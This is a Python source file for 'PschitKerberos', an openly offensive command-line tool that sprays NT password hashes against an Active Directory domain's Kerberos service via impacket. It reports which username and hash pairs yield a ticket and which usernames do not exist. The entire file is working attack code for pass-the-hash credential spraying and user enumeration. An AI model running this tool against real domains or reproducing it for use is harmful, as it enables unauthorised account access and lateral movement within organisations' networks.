#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : pschitkerberos.py
# Author             : Anh4ckin3 
# Date created       : 17 Dec 2024

import argparse
import pyfiglet 
import socket
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5.types import Principal
from impacket.krb5 import constants
from termcolor import colored
from binascii import unhexlify

class PschitKerberos:
    def __init__(self, user, domain, hash, password=None, aesKey=None, dc_ip=None, verbose=False):
        self.user = user
        self.domain = domain
        self.hash = hash
        self.password = password
        self.aesKey = aesKey
        self.dc_ip = dc_ip
        self.verbose = verbose

    def spray(self):
        lmhash = None
        nthash = self.hash
        if self.verbose:
            print(f"[*] Attempting spray with user: {self.user}, domain: {self.domain}, hash: {self.hash}")
        try:
            principal_krb = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            auth = getKerberosTGT(principal_krb, self.password, self.domain, lmhash, unhexlify(nthash), self.aesKey, self.dc_ip)
            if self.verbose:
                print(f"[+] Successful authentication for {self.user}:{self.hash}")
            return True
            
        except KerberosError as e:
            if (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_WRONG_REALM.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value):
                if self.verbose:
                    print(f"[-] Kerberos error: {e}")
                return e
            elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
                return False
            else:
                if self.verbose:
                    print(f"[+] Successful authentication for {self.user}:{self.hash}")
                return True
        except socket.error as e:
            print('[-] Could not connect to DC')
            return


def main():
    
    info = colored("[*]", "blue")
    success = colored("[+]", "green")
    error = colored("[-]", "red")

    banner = pyfiglet.figlet_format("PschitKerberos") 

    parser = argparse.ArgumentParser(description="Ca spray fort !")
    parser.add_argument('-username', help='Username used to spray NTLM hash(es)')
    parser.add_argument('-hash', help="NT hash to spray")
    parser.add_argument('-hashfile', help='NT hashes file to spray')
    parser.add_argument('-domain', required=True, help="Target domain")
    parser.add_argument('-dc', help="target IP (KDC)")
    parser.add_argument('-verbose', action='store_true', help="Enable verbose mode")

    args = parser.parse_args()

    print(banner)
    # IF file is given on argument
    if args.hashfile:
        print(f"{info} Testing multiple hashes from file: {args.hashfile} against domain: {args.domain}")
        with open(args.hashfile, 'r') as hash:
            for line in hash:
                hash = line.strip()
                kerberos_sprayer = PschitKerberos(user=args.username, domain=args.domain, hash=hash, password=None, aesKey=None, dc_ip=args.dc, verbose=args.verbose)
                match kerberos_sprayer.spray():
                    case True:
                        print(f'{success} {args.username}:{hash} is valid credential')
                        break
                    case False:
                        print(f'{error} {args.username} does not exist in the domain {args.domain}')
                        break
                    case _:
                        if args.verbose:
                            print(f'{error} {args.username}:{args.hash}', kerberos_sprayer.spray())
    # IF just one is given on argument
    if args.hash:
        print(f"{info} Testing a single hash against domain: {args.domain}")
        kerberos_sprayer = PschitKerberos(user=args.username, domain=args.domain, hash=args.hash, password=None, aesKey=None, dc_ip=args.dc, verbose=args.verbose)
        match kerberos_sprayer.spray():
            case True:
                print(f'{success} {args.username}:{args.hash} is valid credential')
            case False:
                print(f'{error} {args.username} does not exist in the domain {args.domain}')
            case _:
                print(f'{error} {args.username}:{args.hash} is not a valid credential in the domain {args.domain}')
                if args.verbose:
                 print(f'{error} {args.username}:{args.hash}', kerberos_sprayer.spray())

    if not args.hash and not args.hashfile:
        parser.error('-hash or -hashfile is required')

if __name__ == "__main__":
    main()
